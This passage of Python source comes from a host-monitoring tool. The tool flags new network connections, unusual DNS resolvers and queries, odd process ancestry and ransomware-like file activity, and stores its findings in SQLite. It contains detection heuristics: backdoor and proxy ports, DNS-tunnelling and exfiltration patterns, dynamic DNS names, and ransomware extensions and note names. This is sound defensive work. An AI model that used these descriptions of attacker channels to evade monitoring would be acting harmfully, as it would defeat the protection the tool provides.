            out["created"].append({"path": path, "size": size, "mtime": mtime})
        elif prev[0] != mtime or prev[1] != size:
            out["modified"].append({"path": path, "size": size, "mtime": mtime,
                                    "previous_size": prev[1],
                                    "size_delta": size - prev[1]})
    for path in before_files:
        if path not in after_files:
            out["deleted"].append({"path": path})
    for entry in out["created"]:
        ext = os.path.splitext(entry["path"])[1].lower()
        if ext in SUSPICIOUS_EXTENSIONS:
            out["renamed_suspicious"].append({**entry, "extension": ext})
        base = os.path.basename(entry["path"]).lower()
        if any(h in base for h in RANSOM_NOTE_HINTS) and \
                os.path.splitext(base)[1] in (".txt", ".html", ".hta", ".rtf", ""):
            out["notes"].append(entry)
    touched = len(out["modified"]) + len(out["created"]) + len(out["deleted"])
    out["touched"] = touched
    out["rate"] = round(touched / window_seconds, 2) if window_seconds > 0 else 0.0
    return out


def summarise_changes(diff: dict) -> dict:
    """Group by directory and extension, because 400 files in one folder and 400
    scattered across a home directory mean very different things."""
    by_dir: dict[str, int] = {}
    by_ext: dict[str, int] = {}
    for entry in diff["modified"] + diff["created"]:
        d = os.path.dirname(entry["path"])
        by_dir[d] = by_dir.get(d, 0) + 1
        ext = os.path.splitext(entry["path"])[1].lower() or "(no extension)"
        by_ext[ext] = by_ext.get(ext, 0) + 1
    return {
        "by_directory": sorted(by_dir.items(), key=lambda x: -x[1])[:12],
        "by_extension": sorted(by_ext.items(), key=lambda x: -x[1])[:12],
        "directories": len(by_dir), "extensions": len(by_ext),
        "spread": round(len(by_dir) / max(diff["touched"], 1), 3),
    }


# =============================================================================
# SECTION 6 - Findings, across all four detectors
# =============================================================================

def analyse_connections(conns: Result, baseline: dict, resolvers: dict) -> list[dict]:
    out: list[dict] = []
    if conns.status == "unavailable":
        return [F("connections", "Connections", "The connection detector did not run",
                  "info", conns.detail, "",
                  "Nothing below was checked. An empty result means 'not checked'.")]
    rows = conns.data["connections"]
    approved = {k for k, v in baseline.items() if v.get("approved")}
    seen_before = set(baseline)
    new = [c for c in rows if c["key"] not in seen_before]
    known = [c for c in rows if c["key"] in seen_before]
    first_run = not baseline

    if first_run and rows:
        out.append(F("connections", "Baseline", f"First run: {len(rows)} connection(s) "
                     "recorded as the baseline", "info",
                     "Everything is new on a first run, so nothing is reported as new.",
                     "\n".join(_conn_line(c) for c in rows[:10]),
                     "Run this again to see what is genuinely new. Anything already "
                     "happening now becomes normal by definition - if you suspect this "
                     "machine already, a baseline taken here inherits that."))
    elif new:
        public = [c for c in new if c["remote_class"] == "public"
                  and c["key"] not in approved]
        notable = [c for c in new if c.get("port_note") and c["key"] not in approved]
        sev = "high" if public else "medium"
        out.append(F("connections", "New", f"{len(new)} connection(s) not seen before",
                     sev,
                     "These pairings of program and destination are new since the last "
                     "check.",
                     "\n".join(_conn_line(c) for c in new[:12]),
                     "The first time you use any program this is exactly what it looks "
                     "like. What is worth reading is the program column: a new destination "
                     "for a browser is unremarkable, a new destination for something that "
                     "has no business on the network is not."))
        for c in notable[:6]:
            out.append(F("connections", "Port", f"New connection to port "
                         f"{c['remote_port']} - {c['port_note']}",
                         "high" if c["remote_port"] in (4444, 31337, 6667, 9050, 1080,
                                                        23, 5555) else "medium",
                         f"{c['process'] or 'an unidentified process'} connected to "
                         f"{c['remote_ip']}:{c['remote_port']}.",
                         _conn_line(c),
                         f"Port {c['remote_port']} is {c['port_note']}. That is a fact "
                         f"about the port, not about this connection - plenty of "
                         f"legitimate software uses unusual ports."))
    else:
        out.append(F("connections", "New", "No new connections", "info",
                     f"{len(known)} connection(s), all seen before.", "",
                     POLLING_LIMIT))

    unowned = [c for c in rows if not c.get("pid")]
    if unowned:
        out.append(F("connections", "Ownership", f"{len(unowned)} connection(s) have no "
                     f"identifiable process", "low",
                     f"Owner coverage is {conns.data['owner_coverage']}%.",
                     "\n".join(_conn_line(c) for c in unowned[:6]),
                     "Usually a privilege limit - another user's process, or a socket "
                     "belonging to a process outside this namespace such as the host of a "
                     "container. Running as root improves coverage. It is not evidence of "
                     "hiding."))
    listening = conns.data["listening"]
    external = [l for l in listening if l["local_ip"] not in ("127.0.0.1", "::1")]
    if external:
        out.append(F("connections", "Listening", f"{len(external)} port(s) listening on "
                     f"more than loopback", "low",
                     "These accept connections from the network, not only this machine.",
                     "\n".join(f"{l['proto']} {l['local_ip']}:{l['local_port']}"
                               + (f"  {l['process']}" if l.get("process") else "")
                               for l in external[:10]),
                     "Expected for anything meant to serve the network. A listener you do "
                     "not recognise is worth identifying - that is what a backdoor looks "
                     "like, and equally what a development server looks like."))
    return out


def _conn_line(c: dict) -> str:
    who = c.get("process") or "?"
    if c.get("pid"):
        who += f"({c['pid']})"
    return (f"{who} -> {c['remote_ip']}:{c['remote_port']} "
            f"{c['proto']} {c['state']} [{c['remote_class']}]")


def analyse_dns(capture: Result, dns_conns: list[dict], resolvers: dict,
                baseline: dict) -> list[dict]:
    out: list[dict] = []
    configured = set(resolvers.get("resolvers") or [])

    talking_to = {c["remote_ip"] for c in dns_conns}
    unexpected = talking_to - configured
    if configured:
        out.append(F("dns", "Resolvers", f"Configured resolver(s): "
                     f"{', '.join(sorted(configured))}", "info",
                     f"From {resolvers.get('source') or 'the system configuration'}.",
                     "", "Queries going anywhere else are what this detector looks for."))
    if unexpected:
        out.append(F("dns", "Resolvers", f"{len(unexpected)} resolver(s) being queried "
                     f"that are not configured", "high",
                     "Something is sending DNS to a server the system is not configured "
                     "to use.",
                     "\n".join(f"{ip}" + (f"  (from {c['process']})" if c.get("process")
                                          else "")
                               for ip in sorted(unexpected)
                               for c in dns_conns if c["remote_ip"] == ip),
                     "A program with its own hard-coded resolver does this, and so does "
                     "malware bypassing your filtering. Container runtimes and VPN clients "
                     "are common innocent explanations."))

    if capture.status == "unavailable":
        out.append(F("dns", "Capture", "Query names were NOT captured", "info",
                     capture.detail, "",
                     "Which resolvers are being contacted is still reported above. An "
                     "empty query list here means 'not captured', not 'no queries'. "
                     + DOH_BLIND_SPOT))
        return out

    queries = [q for q in capture.data["queries"] if not q["is_response"]]
    if not queries:
        out.append(F("dns", "Capture", "No DNS queries were seen", "info",
                     f"{capture.data['packets']} packet(s) examined over "
                     f"{capture.data['seconds']:.0f}s.", "",
                     DOH_BLIND_SPOT + " Silence here is genuinely ambiguous: it can mean a "
                     "quiet machine, or a machine whose name resolution you cannot see."))
        return out

    names: dict[str, int] = {}
    for q in queries:
        names[q["qname"]] = names.get(q["qname"], 0) + 1
    seen_before = set(baseline)
    new_names = [n for n in names if n not in seen_before]
    out.append(F("dns", "Queries", f"{len(queries)} quer(ies) for {len(names)} distinct "
                 f"name(s)", "info",
                 f"Captured over {capture.data['seconds']:.0f}s.",
                 "\n".join(f"{n}  x{c}" for n, c in
                           sorted(names.items(), key=lambda x: -x[1])[:12]),
                 DOH_BLIND_SPOT))
    if new_names and baseline:
        out.append(F("dns", "Queries", f"{len(new_names)} name(s) queried for the first "
                     f"time", "medium",
                     "These have not been asked for before.",
                     "\n".join(new_names[:15]),
                     "Every name is new once. This is useful as a list to skim, not as a "
                     "list of problems."))

    doh = [n for n in names if n in DOH_HOSTS]
    if doh:
        out.append(F("dns", "Bypass", f"{len(doh)} DNS-over-HTTPS provider(s) resolved",
                     "medium",
                     "Something looked up the address of a DoH endpoint, which usually "
                     "means it is about to start resolving through it.",
                     "\n".join(doh),
                     "After this, that program's DNS becomes invisible here - it is "
                     "HTTPS to port 443. Modern browsers do this by default, so it is "
                     "most likely yours. It still means you lose visibility."))
    dyn = [n for n in names if any(n.endswith(s) for s in DYNAMIC_DNS_SUFFIXES)]
    if dyn:
        out.append(F("dns", "Names", f"{len(dyn)} dynamic DNS or tunnelling name(s)",
                     "medium",
                     "These providers let anyone point a name at any address, and are "
                     "used both for legitimate self-hosting and for command and control.",
                     "\n".join(dyn[:10]),
                     "ngrok and similar are everyday development tools. The same names "
                     "are used to reach a machine that should not be reachable, so it is "
                     "worth knowing which this is."))
    long_names = [n for n in names if len(n.split(".")[0]) > 40]
    if long_names:
        out.append(F("dns", "Names", f"{len(long_names)} name(s) with a very long first "
                     f"label", "medium",
                     "A long random-looking label is how data is smuggled out over DNS: "
                     "the label carries the payload.",
                     "\n".join(shorten(n, 90) for n in long_names[:6]),
                     "Content delivery networks and some antivirus products also generate "
                     "long labels legitimately. Volume is the tell - tunnelling produces a "
                     "steady stream of them to one domain."))
    txt = [q for q in queries if q["qtype"] == "TXT"]
    if len(txt) > 5:
        out.append(F("dns", "Names", f"{len(txt)} TXT queries", "medium",
                     "TXT records carry arbitrary text, which makes them the usual choice "
                     "for a DNS tunnel's return path.",
                     "\n".join(sorted({q["qname"] for q in txt})[:8]),
                     "Ordinary in small numbers - SPF and domain verification use TXT. A "
                     "steady stream to one domain is the pattern that matters."))
    return out


def analyse_processes(procs: Result, baseline: dict) -> list[dict]:
    out: list[dict] = []
    if procs.status == "unavailable":
        return [F("processes", "Processes", "The process detector did not run", "info",
                  procs.detail, "", "Nothing below was checked.")]
    hits = analyse_ancestry(procs.data["processes"])
    approved = {k for k, v in baseline.items() if v.get("approved")}
    for h in hits:
        key = f"{h['parent']}>{h['child']}"
        if key in approved:
            continue
        out.append(F("processes", "Ancestry", h["label"].capitalize(), h["severity"],
                     f"{h['parent']} started {h['child']}"
                     + (f" as {h['user']}" if h.get("user") else "") + ".",
                     f"chain: {h['chain']}\n"
                     f"parent: {h['parent_cmdline'] or '-'}\n"
                     f"child : {h['child_cmdline'] or '-'}",
                     h["why"]))
    if not out:
        out.append(F("processes", "Ancestry", "No unusual parent-child pairs", "info",
                     f"{procs.data['count']} process(es) examined.", "",
                     POLLING_LIMIT + " A process that ran and exited between checks leaves "
                     "no trace here."))
    if procs.data.get("denied"):
        out.append(F("processes", "Coverage", f"{procs.data['denied']} process(es) could "
                     f"not be read", "low", "Their ancestry was not examined.", "",
                     "Usually another user's processes. Running as root covers more."))
    return out


def analyse_files(diff: dict, summary: dict, root: str,
                  threshold: float) -> list[dict]:
    out: list[dict] = []
    touched = diff["touched"]
    rate = diff["rate"]

    if diff["renamed_suspicious"]:
        out.append(F("files", "Ransomware", f"{len(diff['renamed_suspicious'])} file(s) "
                     f"created with an extension associated with encryption", "critical",
                     "Files appeared with suffixes that encryption tools append.",
                     "\n".join(f"{e['path']}  ({e['extension']})"
                               for e in diff["renamed_suspicious"][:10]),
                     "Combined with a burst of modifications this is the clearest "
                     "ransomware signal there is. Disconnect the machine from the network "
                     "before anything else - encryption in progress continues while you "
                     "investigate, and a network share is reachable from here."))
    if diff["notes"]:
        out.append(F("files", "Ransomware", f"{len(diff['notes'])} file(s) that look like "
                     f"a ransom note", "critical",
                     "Files appeared whose names match the pattern of recovery "
                     "instructions.",
                     "\n".join(e["path"] for e in diff["notes"][:8]),
                     "Read one before assuming - README files are also completely "
                     "ordinary. The name pattern alone is weak; alongside mass "
                     "modification it is not."))

    if touched == 0:
        out.append(F("files", "Activity", "No files changed", "info",
                     f"Nothing under {root} changed during the window.", "",
                     "Only files present at the first snapshot and still present at the "
                     "second are compared - a file created and deleted in between is "
                     "invisible."))
        return out

    sev = ("critical" if rate >= threshold * 4 else "high" if rate >= threshold
           else "medium" if rate >= threshold / 4 else "info")
    out.append(F("files", "Activity", f"{touched} file(s) changed - {rate:.1f} per second",
                 sev,
                 f"{len(diff['modified'])} modified, {len(diff['created'])} created, "
                 f"{len(diff['deleted'])} deleted over {diff['window']:.0f}s under {root}.",
                 "top directories:\n"
                 + "\n".join(f"  {d}  ({n})" for d, n in summary["by_directory"][:6])
                 + "\ntop extensions:\n"
                 + "\n".join(f"  {e}  ({n})" for e, n in summary["by_extension"][:6]),
                 "A compile, an unzip, a package install, a backup and a git checkout all "
                 "look exactly like this. What separates them from encryption is the "
                 "pattern: a build writes into build directories with predictable "
                 "extensions, while encryption sweeps whatever is there. The breakdown "
                 "above is the thing to read."))
    if summary["spread"] > 0.5 and touched > 20:
        out.append(F("files", "Pattern", "Changes are spread thinly across many "
                     "directories", "high",
                     f"{summary['directories']} directories for {touched} files - roughly "
                     f"one file per directory.",
                     f"spread ratio {summary['spread']}",
                     "A build concentrates its writes; something walking a tree and "
                     "touching everything it finds does not. This is the shape of the "
                     "second, which is what encryption looks like - though so does a "
                     "recursive chmod, a virus scan updating timestamps, or an rsync."))
    if len(diff["deleted"]) > max(20, touched * 0.4):
        out.append(F("files", "Pattern", f"{len(diff['deleted'])} file(s) deleted", "high",
                     "A large share of the change is deletion.",
                     "\n".join(e["path"] for e in diff["deleted"][:8]),
                     "Encryption tools that write a new file and remove the original "
                     "produce this. So does a cleanup, an uninstall, or a build that "
                     "clears its output directory first."))
    growth = [e for e in diff["modified"] if e.get("size_delta", 0) > 0]
    if len(growth) > 20 and len(growth) > len(diff["modified"]) * 0.8:
        out.append(F("files", "Pattern", f"{len(growth)} modified file(s) all grew", "medium",
                     "Almost every modified file got larger.",
                     f"{len(growth)} of {len(diff['modified'])} grew",
                     "Encryption adds padding and headers, so encrypted files are slightly "
                     "larger than the originals. Appending to logs does the same thing."))
    return out


# =============================================================================
# SECTION 7 - Database
# =============================================================================

SCHEMA = """
CREATE TABLE IF NOT EXISTS scans (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ts TEXT NOT NULL, hostname TEXT, detectors TEXT, mode TEXT,
    connections INTEGER DEFAULT 0, new_connections INTEGER DEFAULT 0,
    dns_queries INTEGER DEFAULT 0, processes INTEGER DEFAULT 0,
    ancestry_hits INTEGER DEFAULT 0, files_touched INTEGER DEFAULT 0,
    file_rate REAL DEFAULT 0, watch_root TEXT, window_seconds REAL,
    score REAL DEFAULT 0, band TEXT, status TEXT, detail TEXT,
    elapsed_ms INTEGER, payload TEXT,
    critical INTEGER DEFAULT 0, high INTEGER DEFAULT 0, medium INTEGER DEFAULT 0,
    low INTEGER DEFAULT 0, info INTEGER DEFAULT 0, note TEXT
);
CREATE TABLE IF NOT EXISTS findings (
    id INTEGER PRIMARY KEY AUTOINCREMENT, scan_id INTEGER NOT NULL,
    detector TEXT, category TEXT, title TEXT, severity TEXT, description TEXT,
    evidence TEXT, advice TEXT, FOREIGN KEY (scan_id) REFERENCES scans(id)
);
CREATE TABLE IF NOT EXISTS known (
    key TEXT NOT NULL, kind TEXT NOT NULL, first_seen TEXT, last_seen TEXT,
    times_seen INTEGER DEFAULT 0, detail TEXT, approved INTEGER DEFAULT 0,
    approved_at TEXT, label TEXT, PRIMARY KEY (key, kind)
);
CREATE TABLE IF NOT EXISTS audit_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ts TEXT NOT NULL, level TEXT NOT NULL, source TEXT, message TEXT, scan_id INTEGER
);
CREATE INDEX IF NOT EXISTS idx_find_scan ON findings(scan_id);
CREATE INDEX IF NOT EXISTS idx_find_det ON findings(detector);
CREATE INDEX IF NOT EXISTS idx_known_kind ON known(kind);
CREATE INDEX IF NOT EXISTS idx_audit_ts ON audit_log(ts);
"""

_DB_PATH = DEFAULT_DB


def set_db_path(p: str) -> None:
    global _DB_PATH
    _DB_PATH = p


def db_path() -> str:
    return _DB_PATH


def connect(path: str | None = None) -> sqlite3.Connection:
    conn = sqlite3.connect(path or _DB_PATH, timeout=30.0)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=30000")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn


def init_db(conn=None) -> None:
    own = conn is None
    conn = conn or connect()
    try:
        conn.executescript(SCHEMA)
        conn.commit()
    finally:
        if own:
            conn.close()


def q(sql: str, args: tuple = (), conn=None) -> list[sqlite3.Row]:
    own = conn is None
    conn = conn or connect()
    try:
        return conn.execute(sql, args).fetchall()
    finally:
        if own:
            conn.close()


def q1(sql: str, args: tuple = (), conn=None):
    rows = q(sql, args, conn)
    return rows[0] if rows else None


def log_event(level: str, source: str, message: str, scan_id=None, conn=None) -> None:
    own = conn is None
    conn = conn or connect()
    try:
        conn.execute("INSERT INTO audit_log (ts, level, source, message, scan_id) "
                     "VALUES (?,?,?,?,?)",
                     (now_iso(), level.upper(), source,
                      " ".join(str(message).split())[:1000], scan_id))
        conn.commit()
    except Exception:
        pass
    finally:
        if own:
            conn.close()


def known_map(kind: str, conn=None) -> dict:
    out = {}
    for r in q("SELECT * FROM known WHERE kind=?", (kind,), conn):
        d = dict(r)
        d["approved"] = bool(d["approved"])
        out[d["key"]] = d
    return out


def remember(kind: str, key: str, detail: str = "", conn=None) -> None:
    own = conn is None
    conn = conn or connect()
    try:
        ts = now_iso()
        conn.execute(
            "INSERT INTO known (key, kind, first_seen, last_seen, times_seen, detail) "
            "VALUES (?,?,?,?,1,?) ON CONFLICT(key, kind) DO UPDATE SET "
            "last_seen=?, times_seen=times_seen+1",
            (key, kind, ts, ts, detail[:500], ts))
        if own:
            conn.commit()
    except Exception:
        pass
    finally:
        if own:
            conn.close()


def approve(kind: str, key: str, label: str = "") -> tuple[bool, str]:
    conn = connect()
    try:
        init_db(conn)
        row = q1("SELECT * FROM known WHERE kind=? AND key=?", (kind, key), conn)
        if not row:
            matches = q("SELECT * FROM known WHERE kind=? AND key LIKE ?",
                        (kind, f"%{key}%"), conn)
            if len(matches) > 1:
                return False, (f"'{key}' matches {len(matches)} entries. Be more specific: "
                               + ", ".join(m["key"] for m in matches[:3]))
            if not matches:
                return False, (f"'{key}' has not been seen as a {kind}. Run a check first.")
            row = matches[0]
        conn.execute("UPDATE known SET approved=1, approved_at=?, "
                     "label=COALESCE(NULLIF(?,''), label) WHERE kind=? AND key=?",
                     (now_iso(), label, kind, row["key"]))
        conn.commit()
        log_event("INFO", "baseline", f"Approved {kind}: {row['key']}", None, conn)
        return True, row["key"]
    finally:
        conn.close()


def revoke(kind: str, key: str) -> int:
    conn = connect()
    try:
        n = conn.execute("UPDATE known SET approved=0, approved_at=NULL "
                         "WHERE kind=? AND (key=? OR key LIKE ?)",
                         (kind, key, f"%{key}%")).rowcount
        conn.commit()
        return n
    finally:
        conn.close()


def latest_scan_id(conn=None):
    row = q1("SELECT id FROM scans ORDER BY id DESC LIMIT 1", (), conn)
    return row["id"] if row else None


def scan_summary(sid: int, conn=None):
    row = q1("SELECT * FROM scans WHERE id=?", (sid,), conn)
    if not row:
        return None
    d = dict(row)
    try:
        d["payload"] = json.loads(d["payload"] or "{}")
    except json.JSONDecodeError:
        d["payload"] = {}
    try:
        d["detectors"] = json.loads(d["detectors"] or "[]")
    except json.JSONDecodeError:
        d["detectors"] = []
    d["band_colour"] = risk_band(d["score"] or 0)[1]
    return d


def risk_score(findings: list[dict]) -> float:
    return round(clamp(sum(SEV_WEIGHT[f["severity"]] for f in findings), 0, 100), 1)


def run_check(detectors: list[str] | None = None, watch_root: str | None = None,
              window: float = 5.0, capture_seconds: float = 0.0,
              max_files: int = 200_000, file_threshold: float = 20.0,
              note: str = "", mode: str = "check") -> dict:
    """Run the selected detectors and record one combined result."""
    t0 = time.time()
    init_db()
    detectors = detectors or list(DETECTORS)
    out = {"detectors": detectors, "findings": [], "checked_at": now_iso(),
           "sources": {}, "watch_root": watch_root, "window": window}
    resolvers = configured_resolvers()
    out["resolvers"] = resolvers

    conns = Result("connections").unavailable("not selected")
    dns_conns: list[dict] = []
    if "connections" in detectors or "dns" in detectors:
        conns = read_connections()
        if conns.data:
            dns_conns = dns_connections(conns.data["connections"])
    if "connections" in detectors:
        base = known_map("connection")
        out["findings"] += analyse_connections(conns, base, resolvers)
        out["sources"]["connections"] = {"status": conns.status, "detail": conns.detail}
        if conns.data:
            out["connections"] = conns.data["connections"]
            out["listening"] = conns.data["listening"]
            conn = connect()
            try:
                for c in conns.data["connections"]:
                    remember("connection", c["key"], _conn_line(c), conn)
                conn.commit()
            finally:
                conn.close()

    if "dns" in detectors:
        capture = Result("dns_capture").unavailable(
            "capture was not requested, so query names were not seen. Use "
            "--capture-seconds to sniff them; which resolvers are contacted is still "
            "reported.")
        if capture_seconds > 0:
            capture = capture_dns(capture_seconds)
        base = known_map("dnsname")
        out["findings"] += analyse_dns(capture, dns_conns, resolvers, base)
        out["sources"]["dns"] = {"status": capture.status, "detail": capture.detail}
        out["dns_queries"] = (capture.data or {}).get("queries", [])
        out["dns_connections"] = dns_conns
        if capture.data:
            conn = connect()
            try:
                for qq in capture.data["queries"]:
                    if not qq["is_response"]:
                        remember("dnsname", qq["qname"], qq["qtype"], conn)
                conn.commit()
            finally:
                conn.close()

    if "processes" in detectors:
        procs = read_processes()
        base = known_map("ancestry")
        out["findings"] += analyse_processes(procs, base)
        out["sources"]["processes"] = {"status": procs.status, "detail": procs.detail}
        if procs.data:
            hits = analyse_ancestry(procs.data["processes"])
            out["ancestry"] = hits
            out["process_count"] = procs.data["count"]
            conn = connect()
            try:
                for h in hits:
                    remember("ancestry", f"{h['parent']}>{h['child']}", h["label"], conn)
                conn.commit()
            finally:
                conn.close()

    if "files" in detectors:
        if not watch_root:
            out["findings"].append(F("files", "Files", "No directory was given to watch",
                                     "info",
                                     "The file detector needs a directory.", "",
                                     "Pass --watch-root PATH. Choose somewhere that "
                                     "matters - a home or document directory - rather than "
                                     "the whole filesystem."))
            out["sources"]["files"] = {"status": "unavailable", "detail": "no root given"}
        else:
            before = scan_tree(watch_root, max_files)
            if before.status == "unavailable":
                out["findings"].append(F("files", "Files", "The file detector did not run",
                                         "info", before.detail, "",
                                         "Nothing was compared."))
                out["sources"]["files"] = {"status": "unavailable",
                                           "detail": before.detail}
            else:
                time.sleep(max(0.5, window))
                after = scan_tree(watch_root, max_files)
                diff = diff_trees(before.data, after.data, window)
                summary = summarise_changes(diff)
                out["findings"] += analyse_files(diff, summary, watch_root,
                                                 file_threshold)
                out["file_diff"] = diff
                out["file_summary"] = summary
                out["sources"]["files"] = {"status": after.status,
                                           "detail": after.detail,
                                           "scanned": after.data["scanned"]}

    out["score"] = risk_score(out["findings"])
    out["band"], out["band_colour"] = risk_band(out["score"])
    out["counts"] = {s: sum(1 for f in out["findings"] if f["severity"] == s)
                     for s in SEVERITIES}
    out["elapsed_ms"] = int((time.time() - t0) * 1000)
    out["id"] = save_scan(out, note, mode)
    return out


def save_scan(res: dict, note: str = "", mode: str = "check") -> int:
    conn = connect()
    try:
        init_db(conn)
        counts = res["counts"]
        diff = res.get("file_diff") or {}
        payload = {k: v for k, v in res.items()
                   if k in ("connections", "listening", "ancestry", "dns_queries",
                            "dns_connections", "file_summary", "resolvers", "sources")}
        if diff:
            payload["file_diff"] = {k: (v[:200] if isinstance(v, list) else v)
                                    for k, v in diff.items()}
        detail = "; ".join(f"{k}: {v.get('detail')}"
                           for k, v in (res.get("sources") or {}).items()
                           if v.get("detail"))
        cur = conn.execute(
            "INSERT INTO scans (ts, hostname, detectors, mode, connections,"
            " new_connections, dns_queries, processes, ancestry_hits, files_touched,"
            " file_rate, watch_root, window_seconds, score, band, status, detail,"
            " elapsed_ms, payload, critical, high, medium, low, info, note)"
            " VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
            (res["checked_at"], socket.gethostname(), json.dumps(res["detectors"]), mode,
             len(res.get("connections") or []),
             sum(1 for f in res["findings"]
                 if f["detector"] == "connections" and f["category"] == "New"
                 and "not seen before" in f["title"]),
             len([x for x in (res.get("dns_queries") or []) if not x.get("is_response")]),
             res.get("process_count", 0), len(res.get("ancestry") or []),
             diff.get("touched", 0), diff.get("rate", 0.0),
             res.get("watch_root"), res.get("window"),
             res["score"], res["band"],
             "ok" if not detail else "partial", detail[:500],
             res["elapsed_ms"], json.dumps(payload, default=str),
             counts["critical"], counts["high"], counts["medium"], counts["low"],
             counts["info"], note))
        sid = cur.lastrowid
        for f in res["findings"]:
            conn.execute("INSERT INTO findings (scan_id, detector, category, title,"
                         " severity, description, evidence, advice)"
                         " VALUES (?,?,?,?,?,?,?,?)",
                         (sid, f["detector"], f["category"], f["title"], f["severity"],
                          f["description"], f["evidence"], f.get("advice", "")))
        conn.commit()
        log_event("INFO", "scan",
                  f"{mode}: {len(res['findings'])} finding(s) across "
                  f"{len(res['detectors'])} detector(s), score {res['score']}", sid, conn)
        for f in res["findings"]:
            if f["severity"] == "critical":
                log_event("WARN", f["detector"], f["title"], sid, conn)
        return sid
    finally:
        conn.close()


# =============================================================================
# SECTION 8 - Charts (hand-drawn SVG: no CDN, no JS library, works offline)
# =============================================================================

def svg_detectors(counts_by_detector: dict, sources: dict, width=940,
                  title="What each detector found") -> str:
    """The signature visual: four lanes, one per detector, so a tool that did not
    run is visibly different from one that ran and found nothing."""
    lane_h, gap, pad_t, pad_l = 62, 10, 26, 150
    height = pad_t + len(DETECTORS) * (lane_h + gap) + 10
    bw = width - pad_l - 30
    parts = []
    labels = {"connections": "new connections", "dns": "DNS queries",
              "processes": "process ancestry", "files": "file changes"}
    for i, det in enumerate(DETECTORS):
        y = pad_t + i * (lane_h + gap)
        src = sources.get(det) or {}
        ran = src.get("status") not in (None, "unavailable")
        counts = counts_by_detector.get(det, {})
        total = sum(counts.values())
        worst = next((s for s in SEVERITIES if counts.get(s)), None)
        colour = SEV_COLOR.get(worst, "#3a3f4a") if ran else "#2a2f38"
        parts.append(f'<rect x="6" y="{y}" width="{width - 12}" height="{lane_h}" rx="8" '
                     f'fill="#1a1e26" stroke="{colour}" stroke-width="1.5"/>')
        parts.append(f'<text x="22" y="{y + 24}" class="det">'
                     f'{html_escape(labels[det])}</text>')
        parts.append(f'<text x="22" y="{y + 44}" class="detsub">'
                     f'{html_escape(DETECTOR_COLOR[det] and det)}</text>')
        if not ran:
            parts.append(f'<text x="{pad_l + 20}" y="{y + 34}" '
                         f'style="fill:#8b8f9b;font:12px ui-monospace,monospace">'
                         f'DID NOT RUN - {html_escape(shorten(src.get("detail", ""), 70))}'
                         f'</text>')
            continue
        if total == 0:
            parts.append(f'<text x="{pad_l + 20}" y="{y + 34}" '
                         f'style="fill:#30a46c;font:12px ui-monospace,monospace">'
                         f'ran, found nothing</text>')
            continue
        x = pad_l
        for sev in SEVERITIES:
            n = counts.get(sev, 0)
            if not n:
                continue
            w = bw * n / max(total, 1)
            parts.append(f'<rect x="{x:.1f}" y="{y + 18}" width="{max(w, 3):.1f}" '
                         f'height="26" fill="{SEV_COLOR[sev]}">'
                         f'<title>{n} {sev}</title></rect>')
            if w > 26:
                parts.append(f'<text x="{x + w / 2:.1f}" y="{y + 35}" '
                             f'text-anchor="middle" '
                             f'style="fill:#0b0d10;font:700 11px ui-monospace,monospace">'
                             f'{n}</text>')
            x += w
    return (f'<figure class="chart wide"><figcaption>{html_escape(title)} &middot; '
            f'a lane that says DID NOT RUN is not the same as one that ran and found '
            f'nothing</figcaption>'
            f'<svg viewBox="0 0 {width} {height}" width="100%" height="{height}" '
            f'role="img" aria-label="{html_escape(title)}">{"".join(parts)}</svg></figure>')


def svg_tree(hits: list[dict], width=940, title="Process ancestry") -> str:
    """Each suspicious chain drawn as a chain, because the chain IS the finding."""
    if not hits:
        return (f'<div class="chart-empty">{html_escape(title)}: no unusual parent-child '
                f'pairs</div>')
    hits = hits[:8]
    row_h, gap, pad_t = 56, 10, 20
    height = pad_t + len(hits) * (row_h + gap)
    parts = []
    for i, h in enumerate(hits):
        y = pad_t + i * (row_h + gap)
        colour = SEV_COLOR.get(h["severity"], "#8b8f9b")
        parts.append(f'<rect x="6" y="{y}" width="{width - 12}" height="{row_h}" rx="7" '
                     f'fill="#1a1e26" stroke="{colour}" stroke-width="1.4"/>')
        parts.append(f'<text x="20" y="{y + 21}" style="fill:{colour};'
                     f'font:700 11px ui-monospace,monospace">'
                     f'{html_escape(h["severity"].upper())}</text>')
        parts.append(f'<text x="96" y="{y + 21}" class="det">'
                     f'{html_escape(h["label"])}</text>')
        chain = h["chain"].split(" <- ")[::-1]      # oldest ancestor first
        x = 20
        for j, node in enumerate(chain[:6]):
            w = min(150, 9 * len(node) + 18)
            node_colour = colour if j == len(chain[:6]) - 1 else "#31363f"
            parts.append(f'<rect x="{x}" y="{y + 28}" width="{w}" height="20" rx="5" '
                         f'fill="#12161d" stroke="{node_colour}"/>')
            parts.append(f'<text x="{x + w / 2:.0f}" y="{y + 42}" text-anchor="middle" '
                         f'class="node">{html_escape(node[:18])}</text>')
            x += w
            if j < len(chain[:6]) - 1:
                parts.append(f'<text x="{x + 7}" y="{y + 42}" class="arrow">&#8594;</text>')
                x += 20
    return (f'<figure class="chart wide"><figcaption>{html_escape(title)} &middot; '
            f'read left to right: the ancestor that started it, through to the process '
            f'that ran</figcaption>'
            f'<svg viewBox="0 0 {width} {height}" width="100%" height="{height}" '
            f'role="img" aria-label="{html_escape(title)}">{"".join(parts)}</svg></figure>')


def svg_pie(items, size=180, title="Findings by severity", fmt=lambda v: f"{v:g}"):
    items = [(l, float(v), c) for (l, v, c) in items if v and v > 0]
    total = sum(v for _, v, _ in items)
    if total <= 0:
        return f'<div class="chart-empty">{html_escape(title)}: nothing to show</div>'
    cx = cy = size / 2
    r_out, r_in = size / 2 - 10, size / 2 - 42
    parts, legend, angle = [], [], -90.0
    for label, value, color in items:
        sweep = 360.0 * value / total
        if abs(sweep - 360.0) < 1e-9:
            parts.append(f'<circle cx="{cx}" cy="{cy}" r="{(r_out + r_in) / 2:.2f}" '
                         f'fill="none" stroke="{color}" stroke-width="{r_out - r_in:.2f}"/>')
        else:
            a0, a1 = math.radians(angle), math.radians(angle + sweep)
            x0, y0 = cx + r_out * math.cos(a0), cy + r_out * math.sin(a0)
            x1, y1 = cx + r_out * math.cos(a1), cy + r_out * math.sin(a1)
            x2, y2 = cx + r_in * math.cos(a1), cy + r_in * math.sin(a1)
            x3, y3 = cx + r_in * math.cos(a0), cy + r_in * math.sin(a0)
            lg = 1 if sweep > 180 else 0
